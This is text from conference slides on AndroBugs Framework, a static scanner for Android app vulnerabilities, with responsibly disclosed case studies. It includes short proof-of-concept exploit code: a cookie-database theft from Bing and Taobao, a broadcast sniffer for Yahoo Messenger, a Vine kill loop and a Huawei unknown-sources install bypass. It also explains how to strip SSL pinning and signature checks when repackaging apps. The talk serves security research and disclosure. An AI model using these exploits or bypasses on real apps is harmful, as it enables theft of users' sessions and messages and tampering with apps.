1

Speaker Bio
Yu-Cheng Lin ()
 Software Engineer at MediaTek smartphone security team  M.S. from Information Security Lab of National Tsing Hua University  Taiwan  Twitter: @AndroBugs  Email: androbugs.framework@gmail.com  Website: http://www.AndroBugs.com
I am not representing my employer. This research is part of my Master thesis in 2014. All the vulnerabilities in these slides have been responsibly disclosed to the developers
several months earlier.
2

Agenda
 Android Security Basic Background  Introduction to AndroBugs Framework  AndroBugs Framework: Design Architecture  Security Vulnerabilities and Vulnerability Vectors Implemented in
AndroBugs Framework  Massive Analysis with AndroBugs Framework  Repackaging APK and Hacking with AndroBugs Framework  Conclusions
3

Android Security Basic Background

 Every app plays in its sandbox with an unique Linux user and group id
 If two apps want to share data with each other, they both need to specify the same "android:sharedUserId" in the AndroidManifest.xml and sign with the same certificate.
 It should not be considered as a security hole in the app if you have physical access to the device (e.g. allow adb backup).

Facebook Android App (uid=10021)
SQLite DB
username Access token
contacts ...

Yahoo News Android App (A normal app,
uid=10030)
Exploit the security vulnerability in
Facebook Android
4

Why Do I Want To Design This Android App Vulnerability Scanner?

The Same Mistakes Are Being Made Again and Again...
 Prior to 2014:
ACM CCS '12: The most dangerous code in the world: validating SSL certificates in non-browser software (with POC: Mallodroid)
DEFCON 19: Seven Ways to Hang Yourself with Google Android ...
 But today?
 Problem:
Not All the Android developers care about security or they just simply forgot about it
6

Problems of Current Android Vulnerability Assessment Tool or System
 Apps must be installed first to check for vulnerabilities
Drozer or Xposed Framework
 Need source code to analyze  Paid and expensive  Cloud-based system
Revenue-oriented Takes some time for you to upload, analyze and get the report (at least 5-10 mins)
 Massive analysis is not supported
Oh NO! We are pen-testers!
 Complicated installation procedure, needs to install too many 3rd party libraries with some compatible issues
7

Introduction to AndroBugs Framework
 A system that helps find valid security vulnerabilities in an Android App.
 Open source and written in Python.  A static analysis tool eating Android APK (no source code).  Scan for "known common coding vulnerabilities"  Designed for massive analysis and to efficiently finding bugs.  You can easily extend new features or vulnerability vectors.
8

What Can AndroBugs Framework Do For You?
 Find security vulnerabilities in an app  Check if the code is missing best practices  Check dangerous shell commands (e.g. "su")  Collect Information from millions of apps  Check the app's security protection (for app repackaging hacking)
9

AndroBugs Framework Helps You Find Vulnerabilities:

Broken WebView configs

MODE_WORLD_READABLE

Which Packer?

WebView SSL

Checking Cert

Exported components

SSL Vulnerability Signature

KeyStore Protection?
isDebuggable

ContentProvider

Fragment

Implicit Service

Vulnerability

injection

Using Certificate Pinning?
addJavascriptInterface
Master Key

ADB backup

Using SQLCipher?

Base64 encoding hack

Sensitive API

usages

...

Dangerous shell command

Contribution to Android App Security
They all triaged my vulnerability report or list me on their Security Hall of Fame. Some will be introduced later.

AndroBugs Framework: Design Architecture

AndroGuard: The Decompiler for AndroBugs Framework
 The original AndroGuard does not have a security vulnerability checking feature.
 The AndroBugs Framework is based on AndroGuard and I modified the core of AndroGuard a lot.
 grep -nFr "#Added by AndroBugs" *
13

General Techniques for Finding Bugs in AndroBugs Framework

Decompile the APK by Androguard
Finding Potentially Vulnerable Code, Function Calls (invoke-xxx) or Fields by AndroBugs Framework
Go back to the source function who calls the potential vulnerable function call, analyze related code again to confirm
14

Depends on the implementations of the vectors
Keypoint: AndroBugs Framework does not try to analyze every line of the code. It only does this when it finds something interesting.

The Report from AndroBugs Framework Will Give You
 Vector title  Source code paths  Severity level (Log Level)  Vector Category  Detail Explanations (tell you the background knowledge of the vulnerability)  Mitigation recommendations  Reference research papers or links
15

Severity Level

Severity Level Critical Warning
Notice Info

Description
Confirmed security vulnerability that should be solved (except for testing code)
AndroBugs Framework is not sure if this is a security vulnerability. Developers need to manually confirm.
Low priority issue or AndroBugs Framework tries to let you know some additional information.
No security issue detected.

16

Introduction to New Assistant Engines in AndroBugs Frameweork
1. Static DVM Engine 2. Efficient String Search Engine 3. Filtering Engine
17

1. Static DVM Engine
 The core of AndroBugs Framework.
Used by some vulnerability vectors in finding potential security vulnerabilities.
 Just like DVM or ART in Android OS, the Static DVM Engine runs the Bytecode statically and partially.
The Static DVM Engine doesn't need to run the Android App on an Android phone but it knows or tries to predict the application's behavior while it is running.
Static DVM Engine runs the code partially.
18

Actions for Static DVM Engine

 Just like Dalvik VM(ART) in Android, the Static DVM Engine maintains a simple register table.

 Compared to the real DVM/ART on Android OS, some useless instructions(opcode) are removed.

opcode 0x12 <= opcode <= 0x1c 0x0a <= opcode <= 0x0d 0x44 <= opcode <= 0x4a
opcode == 0x6e

Smali bytecode
[const] or [const/xx] or [const-string]
[move-result vAA] or [move-result-wide vAA] or [move-result-object vAA] or [move-exception vAA]
[aget] or [aget-xxxx] or [iget] or [iget-xxxx] or [sget] or [sget-xxxx]
[invoke-virtual]

Static DVM action Set immediate value to the register table
Clear immediate value from the register table
Clear immediate value from the register table
Add to the invoked method list

 Android Bytecode Reference: https://source.android.com/devices/tech/dalvik/dalvik-bytecode.html
19

Example: Finding WORLD READABLE or WRITABLE Vulnerability

Java Code of MODE_WORD_READABLE vulnerability context.getSharedPreferences("sensitive_file", 1);

Smali Code of MODE_WORD_READABLE vulnerability
const-string v0, "sensitive_file" const/4 v1, 0x1 invoke-virtual {v2, v0, v1}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences; move-result-object v0

# Smali Bytecode

Register Table of Static DVM Engine

1 const-string v0, "sensitive_file"

v0="sensitive_file"

2 const/4 v1, 0x1

v0="sensitive_file" v1=0x1

3

invoke-virtual {v2, v0, v1}, Landroid/content/Context;>getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPrefere nces;

v0="sensitive_file" v1=0x1

4 move-result-object v0

v1=0x1

20

Class A
Class B Class C

General Techniques for AndroBugs Framework to Find Vulnerability

Function A Function B

Assume We Want to Trace MODE_WORLD_READABLE context.getSharedPreferences("sensitive_file", 1);

Function C

const-string v3, "xxx" const-string v0, "sensitive_file"

Keypoint: Find the key function(getSharedPreferences) first, then go back to the start of the function

const/4 v1, 0x1

invoke-virtual {v2, v0, v1}, Landroid/content/Context;>getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

move-result-object v0

21

Decompiled Level of AndroBugs Framework
Scanning decompiled Java code by Regular Expression is pretty slow. AndroBugs Framework tries NOT to do this.
Android APK

AndroBugs Framework never analyzes decompiled Java code

Bytecode or Opcode
Java Code
22

Why do you need to analyze Java code if you can analyze bytecode (opcode)?

Is The Static DVM Engine Really Working?
 Since The Static DVM Engine is not a real DVM/ART in your Android phone. It does not know, for example, the listing of your root directory:
Runtime runtime = Runtime.getRuntime(); Process p = runtime.exec("ls -al /");
 But why do you need to know that?
 Only knowing it tries to run the command "ls -al /" is enough.
 Dynamic analysis is good, but it is not a good idea if you want to find vulnerabilities in a huge number of APKs immediately. It is too tiresome and time-consuming to install every APK, run it, and maybe manually test it to reproduce the vulnerability.
23

2. Efficient String Search Engine

 Why was this Engine designed?
1. Searching strings in code using "regex matching" is quite inefficient and slow. 2. We not only want to find whether the String exists or not, but the Path sources where it is
showing up.
 Hence, I designed a new Efficient String Search Engine that helps search faster.

One Search Request

Input
Match ID
Regex or Keyword Text

Efficient String Search Engine

Output Match ID Complete String
found Location or Path

24

How does the Efficient String Search Engine work?
 In Android, Strings are referenced by its index position(offset) in string_id_item[]  The Engine compares the "string_data_off (string index)" in the code  In Android bytecode(opcode), Strings are defined by instruction: const-string /
const-string-jumbo (opcode=0x1A / 0x1B)
Steps:
1. Mapping all strings to ids (string_id_item[] to data)
2. Find strings by user's input and get the ids
3. Search code with opcode instruction 0x1A or 0x1B, and compare the ids in step 2
25

3. Filtering Engine
Why?  Some AD libraries may never fix their vulnerabilities and they are
used by many applications.  Some libraries are not vulnerable(false positive) or the impact is
limited. I am not interested in finding them.  We want to bypass some libraries/packages:
 com.parse  com.facebook  com.tapjoy
26

Security Vulnerabilities and Vulnerability Vectors
Implemented in AndroBugs Framework
I will give a few concepts and ideas on how vulnerability vectors are implemented

Where do the vectors come from?
 More than eight Android security books  Previously published papers and research  Slides from security conferences  Android Developer Reference Websites  Previously published security vulnerabilities  My past research experience  Some technical blogs and articles ...
28

How A New Vector Is Created In AndroBugs Framework (1/2) ?
Before Designing A New Vector:
 Research and find related information about the vulnerability  Make a simple POC app to make sure in which platform (Android ICS, JB, KK or L) I
can reproduce the vulnerability  Consider all the possible cases
 Example: Which Android SDK API may use the MODE_WORLD_READABLE mode?
 Decompile the POC app to see the Smali code and think how to add the new vector into AndroBugs Framework
29

How A New Vector Is Created In AndroBugs Framework (2/2) ?

A new vector needs to be tested with at least:
 An App with vulnerable usage  An App with non-vulnerable usage
To enhance the accuracy:
 Many real apps from Google Play should be tested  Doing massive analysis to fix the bugs in implementation
of vector

Design a new vulnerability vector
Test it with a vulnerable app and a non-vulnerable app
Confirm that the system can verify this vulnerability
Do massive scanning
Check the report to see if I need to modify the vector's implementation

Do massive scanning again ...
30

Vulnerability Vector Implementations and Vulnerabilities Discovered
 World Readable & World Writable (Microsoft Office & Baidu)  ContentProvider Vulnerability & Directory Traversal (Microsoft Bing)  WebView File Access Vulnerability & Exported Components (Alibaba
Taobao)
 SSL Vulnerability (Yahoo Mail)  Implicit Broadcast (Yahoo Messenger)  Dynamically Registered Unprotected BroadcastReceiver (Twitter Vine)  Allow Debuggable (Alibaba Taobao Wireless Charge)
All the vulnerabilities were found by Yu-Cheng Lin and have been responsibly disclosed to developers at least several months earlier.
31

My SOP to Check the Vulnerabilities
Get the APK and analyze it with AndroBugs Framework
Get the report from the system
If it reports potential security vulnerability, manually decompile the app (e.g. jadx, apktool), do dynamic analysis, and verify if it is a valid vulnerability.
Try to make a POC app to reproduce the vulnerability
Install the POC app and dynamically verify the vulnerability
32

World Readable & World Writable
From Google's Android developer website: Creating world-readable files is very dangerous, and likely to cause security holes in applications. It is strongly discouraged; instead, applications should use ...
33

Vector Implementation in AndroBugs Framework

1. First, find all the code that calls (or may use dangerous "mode"):
 openOrCreateDatabase  getDir  getSharedPreferences  openFileOutput

2. On finding the function calls, put it into the Static DVM Engine to check the "mode" (introduced earlier). Report the one with the vulnerable "mode":

Mode MODE_WORLD_READABLE MODE_WORLD_WRITEABLE MODE_WORLD_READABLE + MODE_WORLD_WRITEABLE

Constant Value 1 2 3

34

Baidu's MODE_WORLD_READABLE

 Baidu has a push message library that stores the push message Access Token in MODE_WORLD_READABLE
 Many Baidu Android Apps use the vulnerable Baidu push message library
Baidu Books

Baidu News

Baidu Push Message library

Baidu Maps

Baidu Music
35

Vulnerability in Android NDK: Microsoft Office Mobile
(version: 15.0.2720.2000)
When you download files from OneDrive on your ICS phone, you are actually leaking those files to attackers.
<= Android 4.0.X
 Too permissive  Should explicitly set
"umask(007);" first

The DB stores all the paths of user's documents downloaded from OneDrive

Downloaded from OneDrive

>= Android 4.1.X
 Security is improved
 Dynamic analysis is necessary to verify this vulnerability

36

ContentProvider Vulnerability & Directory Traversal

 ContentProvider usually:
1. Directly connects to the SQLite DB in app 2. Provides file access in the app's private data store
 Android developers sometimes forget to set the default exported settings for ContentProvider  This may allow other apps to access sensitive data directly
 AndroBugs Framework highlights the ContentProvider vulnerability.

Setting in AndroidManifest.xml android:targetSdkVersion >= 17 android:targetSdkVersion >= 17 android:targetSdkVersion < 17 android:targetSdkVersion < 17

Android OS Running API Level >= 17 API Level < 17 API Level >= 17 API Level < 17
37

Content Provider Default Exported Value false true true true

Exported ContentProvider
Exported ContentProvider

Attack Vector
ContentProvider allows other apps to access sensitive data
from SQLite DB
ContentProvider opens for file
reading but does not check input
file
38

Vulnerable Vulnerable

Microsoft Bing Android
(version: 5.0.1.20140428)
Affected devices:
 Android 2.X  Android 3.X  Android 4.0.X  Android 4.1.X
39

Microsoft Bing Android
(version: 5.0.1.20140428)

 The ContentProvider does not check if the input uri is valid.
 "File" is vulnerable to directory traversal.

POC String uri = "content://com.microsoft.bing.provider/..%2Fdatabases%2FwebviewCookiesChromium.db"; Log.i("AndroBugs", "Request stealing Uri: " + uri); InputStream is = context.getContentResolver().openInputStream(Uri.parse(uri)); copy(is, os_dst_file_name);
new File("/data/data/com.microsoft.bing/databases%2FwebviewCookiesChromium.db")
new File("/data/data/com.microsoft.bing/cache/..%2Fdatabases%2FwebviewCookiesChromium.db")

BTW, Choose A Reliable Java Decompiler
This code will not always be executed. It is not correct!

WebView File Access Vulnerability & Exported Components
 Attack Vector

Exported Component
(Activity)

WebView: Allow File
Access

Vulnerable

 WebView allows developers to embed a web browser into an application.  If "setAllowFileAccess" in WebSettings is set to true or not set(true by
default), it will allow other applications to read its internal files or databases with crafted url "/data/data/[package name]".

42

Exported Component: Activity
WebView: Allow File Access Vulnerability

Alibaba Taobao Android
(version: 4.2.2)
43

Alibaba Taobao Android (version: 4.2.2)
Result:
POC Intent intent = new Intent("com.taobao.tao.ReminderActivity"); intent.setClassName("com.taobao.taobao", "com.taobao.tao.reminder.ReminderBrowserActivity"); intent.addFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP); intent.putExtra("myBrowserUrl", "file:///data/data/com.taobao.taobao/databases/webviewCo okiesChromium.db"); startActivity(intent);
44

Implementation of This Vector In AndroBugs Framework
How can I check this vulnerability? 1. Find function calls to package name:
"Landroid/webkit/WebSettings;"  Store all the function calls 2. Check which source class and method names does not include
function calls to "setAllowFileAccess(Z)V"  Vulnerable 3. If the WebView sets "setAllowFileAccess(Boolean)"  Put it into the
Static DVM Engine and report those that allow file access which are vulnerable
45

SSL Vulnerability

 AndroBugs Framework reports (showed as "SSL_Security" category):
SSL implementation issues in Java code WebView SSL vulnerability

SSL Vulnerability

Transmitting Sensitive Data

Man-In-TheMiddle

Vulnerable

 Tools that help you with verify valid SSL vulnerabilities:
Fiddler Burp Suite
46

Yahoo Mail
(100M+ downloads. Version: 4.0.4)
 Mail Settings  My Mail Account  Sync Yahoo Contacts
 The SSL certificate validation is not checked.
 Leaks all the contacts and Access Token to MITM attackers  Gets Access Token that leads Yahoo Mail's account to be compromised

Not Vulnerable
Vulnerable (allow MITM)
47

Session ID is reusable

Unfortunately, When You Login to Yahoo Mail The First Time ...
It will popup and ask if you want to "Sync contacts" ...
Very User-Friendly ...

Attack Vector:

Implicit Broadcast

Send broadcast without permission or implicitly

The broadcast contains sensitive data

Vulnerable

49

Yahoo Messenger Android
(version: 1.8.6)
Class: com.yahoo.messenger.android.util.NotificationHandler

50M+ downloads

Intent Action for this broadcast

Put the sensitive message in Bundle

Sending broadcast without receiver permission
Yahoo Messenger is using this Notification to notify the user on receiving new message.
50

POC

<receiver android:name=".SniffBroadcastReceiver"

A malicious app with the highest priority to

android:exported="true"

receive the Yahoo Messenger's broadcast.

android:label="SniffBroadcastReceiver" >

<intent-filter android:priority="999">

<action android:name="com.yahoo.android.notification.start" />

</intent-filter>

</receiver>

public class SniffBroadcastReceiver extends BroadcastReceiver { @Override public void onReceive(Context context, Intent intent) { if ("com.yahoo.android.notification.start".equals(intent.getAction())) { Bundle bundle = intent.getExtras(); if (bundle == null) return; Log.i("AndroBugs", "Title=" + bundle.getString("com.yahoo.android.notification.extra.title", "[empty]")); Log.i("AndroBugs", "Text=" + bundle.getString("com.yahoo.android.notification.extra.text", "[empty]")); Log.i("AndroBugs", "Ticker=" + bundle.getString("com.yahoo.android.notification.extra.ticker", "[empty]")); } }
}

 When somebody sends you a private message, the message is leaking.

51

Dynamically Registered Unprotected BroadcastReceiver

Android developers sometimes forget to protect dynamically registered BroadcastReceiver. They only notice the security protection of statically registered BroadcastReceiver in AndroidManifest.xml

Vulnerable App

Other Apps

Dynamically Registered Unprotected BroadcastReceiver (registerReceiver)

Send broadcast to change its original
behavior

Keypoint: The dynamically registered BroadcastReceiver must do some sensitive things after receiving the broadcast.
52

Twitter Vine Android (version: 2.0.3)
50M+ downloads

 It registers a BroadcastReceiver in its base Activity. On receiving the "co.vine.android.FINISH" broadcast, it will terminate the app (Normally, you cannot force to terminate another app without system privilege).

 Result: Users cannot always use the Vine App if the "co.vine.android.FINISH" broadcasts repeatedly.

// Class: co.vine.android.BaseActionBarActivity private final BroadcastReceiver mFinishReceiver = new BroadcastReceiver()

Vulnerable Code

{

public void onReceive(Context paramAnonymousContext, Intent paramAnonymousIntent)

{

if ((paramAnonymousIntent != null) && ("co.vine.android.FINISH".equals(paramAnonymousIntent.getAction())))

BaseActionBarActivity.this.finish();

}

};

public void onCreate(Bundle paramBundle, int paramInt, boolean paramBoolean1, boolean paramBoolean2)

{

...

registerReceiver(this.mFinishReceiver, "co.vine.android.FINISH");

... }

//On running the following code, Vine Android will terminate after 15 secs. Intent i = new Intent("co.vine.android.FINISH");

POC

PendingIntent pi = PendingIntent.getBroadcast(context, 0, i, 0);

AlarmManager alarm = (AlarmManager)getSystemService(Context.ALARM_SERVICE);

alarm.setRepeating(AlarmManager.RTC5_3WAKEUP, System.currentTimeMillis(), 15000, pi);

The Vulnerability in System App

Apps from Unknown Sources Are Not Allow Originally
55

Vulnerability in Huawei's System App: PackageInstaller
(Version: 4.4.2-289, CVE-2014-9135)

Proof-Of-Concept: Bypass Unknown Sources Check
private void bypassPackageInstallerUnknownCheck() { Intent intent = new Intent(); intent.setAction("android.intent.action.INSTALL_PACKAGE"); intent.setData(Uri.fromFile(new File("/mnt/sdcard/Malware.apk")) .buildUpon().authority("com.android.packageinstaller").build()); intent.putExtra("InstallDirectly", true); MainActivity.this.startActivity(intent);
}

HUAWEI P7-L10 (Android 4.4.2)
Class: com.android.packageinstaller.PackageInstallerActivity

56

You Will Never See Install Blocked Again

 The bug has been responsibly disclosed to Huawei a year ago.

57

From The Previous Slides, There Must Be Some Vulnerabilities
You Are Very Familiar With

Problem: The Same Vulnerabilities Are Being Made Again and Again
by AndroBugs Framework

Massive Analysis with AndroBugs Framework
Hunting Vulnerabilities in Android Application is not hard if you use the right way.

Big Data Analyzing with AndroBugs Framework
AndroBugs Framework is integrated with MongoDB (NoSQL DB):
 The analysis result will be stored by Vector ID and Package Name for later analysis.
61

How I Do Massive Scanning?
Find a target company (e.g. M$) and Download all of their Android Apps (e.g. M$ Offxce Mobile)
Run AndroBugs Framework massive analysis tool Find targeting vulnerability by Vector ID and Get the analysis reports from AndroBugs Framework Spend time trying to read Java code (and sometimes smali code), do dynamic analysis, and try to reproduce the vulnerability. Make a POC app to prove it is a valid vulnerability and report it.
62

Massive Analysis Tools Provided by AndroBugs Framework
1. python AndroBugs_MassiveAnalysis.py -b [Your_Analysis_Number] -t [Your_Analysis_Tag] -d [APKs input dir] -o [Report output dir]
 Example: python AndroBugs_MassiveAnalysis.py -b 20151112 -t BlackHat -d ~/All_Your_Apps/ -o ~/Massive_Analysis_Reports
2. python AndroBugs_ReportSummary.py -m massive -b [Your_Analysis_Number] -t [Your_Analysis_Tag]
 Example: python AndroBugs_ReportSummary.py -m massive -b 20151112 -t BlackHat
63

Run the Massive Analysis Tool
64 / 93

Find Your Targets (Favorite Vector) by ReportSummary Tool
65 / 93

Find All the Apps by Your Favorite Vector and Severity Level
3. python AndroBugs_ReportByVectorKey.py -v [Vector ID] -l [Log Level] -b [Your_Analysis_Number] -t [Your_Analysis_Tag]
 Example: python AndroBugs_ReportByVectorKey.py -v WEBVIEW_RCE -l Critical -b 20151112 -t BlackHat

Vector: WEBVIEW_RCE  addJavascriptInterface
66

The searching speed is optimized

Alibaba Taobao Wireless Charge Android
(, Version: 1.1.0)
Find "Allow Debuggable" in Less Than One Second Attack Vector:

< Android 4.1
Enable Debuggable

HTC Sensation

Print Sensitive Information in Logs

Vulnerable

67

Also Allow Dynamic Debugging

Repackaging APK and Hacking with AndroBugs Framework
Not all of the apps are easy to repackage successfully, but it would be easier if you use the right way

<Hacker> Category in AndroBugs Framework (Experiment Use)
Specifically designed for APK repackaging hackers  Vectors in <Hacker> category are NOT vulnerabilities!
Scenario:  If an app detects itself as not using SSL certificate pinning correctly  Its network
connection will fail  If an app detects its signing certificate is not matched with the predefined one  It
should become unusable  If an app detects itself as not installed from Google Play  It should crash itself ...
As you can see there are several ways Android developers will do to protect their applications being hacked
69

AndroBugs Framework Helps You Find The Checkpoints Faster and You Can Remove/Modify Their
Smali Code
AndroBugs Framework gives you the hints to remove the protections

<Hacker>Breaking SSL Certificate pinning with AndroBugs Framework
 Dynamic hooking is also possible to break SSL pinning, but what if we want to make a modified APK?
 A reverse-engineering hacker would like to put the fake (test) root certificate into the KeyStore in the App and repackage the app to allow for MITM attacks.
 What they want to know so as to add a fake (test) certificate to test or repackage? Where is the KeyStore password located? Where is the code to load the KeyStore? Where is the KeyStore file located?
71

I Love Tesla Motors Android
(Version: 2.6. It is using SSL Certificate Pinning)
 You cannot create a connection with Tesla Motors' server under MITM even if you add your own Root Certificate to your device.
72

No Connection to the Remote Server under MITM
73 / 93

Report of Tesla Motors Android

Report from AndroBugs Framework:

Which file may store the keystore

Where is the password to open the keystore
Class: com.teslamotors.client.TeslaClient

Password to open the keystore

Import Your Root Certificate to Tesla Motors' KeyStore for "Testing"
 Replace the trust.keystore in the APK with the modified one.  Sign the APK again.
75

Now! Login Again!
(Connection is created successfully)
This is not a security vulnerability! I just want to make a new Tesla Motors App that is able to MITM!
76

Repackage An APK Should Be Better Because ...
If you install a malicious Root Certificate on Andriod 4.4 or newer devices

<Hacker>isDebuggable?
 Scenario: When repackaging an app, hackers may want to see more logs so they enable the debuggable flag. Developers check this flag to see if their APKs are already being hacked.
 Code used by developers to check debuggable in AndroidManifest.xml:
boolean isDebuggable = (0 != (getApplicationInfo().flags & ApplicationInfo.FLAG_DEBUGGABLE)); if (isDebuggable) {
//do something else }
 Goal:
 Enable the debug mode and pretend as if the debug mode is disabled  Repackage a new workable APK
78

Vector Implementation in AndroBugs Framework
1. Search the calling field: Landroid/content/pm/ApplicationInfo;->flags:I 2. Get the next instruction of the field 3. Check if the opcode of the next instruction is 0xDD(and-int/lit8) 4. Make sure the register number vxx in "iget" and "and-int/lit8" are the same 5. Make sure the last parameter of instruction "and-int/lit8" is 0x2
Java code of Checking Debuggable
boolean isDebuggable = (0 != (getApplicationInfo().flags & ApplicationInfo.FLAG_DEBUGGABLE)); if (isDebuggable) {
//do something else }
Smali code of Checking Debuggable
invoke-virtual {p0}, Lcom/example/androiddebuggable/MainActivity;->getApplicationInfo()Landroid/content/pm/ApplicationInfo; move-result-object v1 iget vxx, v1, Landroid/content/pm/ApplicationInfo;->flags:I and-int/lit8 v1, vxx, 0x2 if-eqz v1, :cond_0
79

<Hacker>Breaking App's Signature-based Protection
 Scenario: If you find the behavior of an app is different (e.g. Unable to login with the correct username and password) after repackaging the app.
 Keypoint:
Some Android developers know that their applications you have repackaged cannot be signed with their own private certificates.
80

81 / 93

Black Hat USA 2013: How to Build a SpyPhone
 The truth is "Not all the apps are so easy to repackage"  Some Android developers already know you want to hack or
repackage their apps. So they check and compare the signature of the certificate with the predefined one.
82

<Hacker>Breaking App's Signature-based Protection
Example:  In WeChat 5.2 Android, you can find if you repackage the app, you
can no longer login to WeChat Android successfully. You must solve the puzzles first so as to login to the repackaged WeChat Android
 AndroBugs Framework helps you find the signature-based security checkpoints (puzzles) and you may have the directions to remove the protections.
83

Tesla Motors Android
Compare with the pre-defined signature hash to determine ...
84

<Hacker> Base64 Decoding Hack
 It's not a security vulnerability.  Some developers tend to hide some sensitive Strings with Base64
encoding and they think it is much more secure.  AndroBugs Framework tries to decode every Base64-like String for
fun.
85

Tumblr Android
(version: 4.0.0.13)
 Prevent the "grep" command from getting sensitive Strings directly?
86

Innocent Code in WeChat Android (version: 5.2  6.3.5.50)
 Please DO NOT hide sensitive Strings in Base64  But PLEASE DO NOT blame on the developers!! Who knows
somebody will try to decode every Base64-like String?
Base64_encode("fu*k")  ZnVjaw==
87

AndroBugs Framework Sometimes Helps You Find Diamonds
88

Source Code of AndroBugs Framework
https://github.com/AndroBugs/AndroBugs_Framework

But Please Remember ...
 If you get the report from AndroBugs Framework, please DO NOT directly copy and paste the report into the security report form:
Verify the issue and make the POC first
90

Conclusions
 Not all companies know about mobile security and have the same attitude or standard toward security. You will need to convince them of your idea, so be prepared with a POC.
 Try to understand or grasp every vulnerability as deep as you can. The most interesting things you've found may be the most dangerous security holes many developers have made.
 Same mistakes are made again and again. AndroBugs Framework can help you find those security vulnerabilities faster and easier.
91

@AndroBugs

androbugs.framework@gmail.com

92

